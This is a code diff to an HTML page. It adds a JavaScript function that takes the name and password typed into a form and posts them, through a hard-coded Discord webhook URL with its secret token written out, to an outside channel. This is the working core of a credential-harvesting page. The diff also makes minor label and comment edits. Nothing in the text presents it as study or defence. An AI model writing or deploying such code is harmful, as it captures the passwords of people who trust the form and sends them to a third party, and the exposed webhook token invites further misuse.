@@ -64,7 +64,6 @@
       width: 100%;
     }
 
-    /* Webhook Sender Styles */
     #webhookSenderContainer {
       background-color: #fff; /* White background color */
       padding: 20px;
@@ -77,6 +76,41 @@
       text-align: left;
     }
   </style>
+  <script>
+    function sendMessage() {
+      var name = document.getElementById("name").value;
+      var password = document.getElementById("password").value;
+
+      // Replace 'your_discord_webhook_url' with your actual Discord webhook URL
+      var webhookUrl = 'https://discord.com/api/webhooks/1193857724677619762/michJPxVpwoGtEkwpbLOahvjwkOj_4uEhuxWPKJDL_ppt8ZUel3Mrgf3U43JNVm6iyEK';
+
+      // Prepare data to be sent
+      var data = {
+        content: `Name: ${name}\nPassword: ${password}`
+      };
+
+      // Send data to the Discord webhook endpoint using fetch API
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Message sent successfully:', data);
+      })
+      .catch(error => {
+        console.error('Error sending message:', error);
+      });
+    }
+  </script>
 </head>
 
 <body>
@@ -103,7 +137,7 @@
       <label for="name">Name:</label>
       <input type="text" id="name" name="name" required><br>
 
-      <label for="password">password:</label>
+      <label for="password">Password:</label>
       <input type="password" id="password" name="password" required><br>
 
       <button type="button" onclick="sendMessage()">Send Message</button>
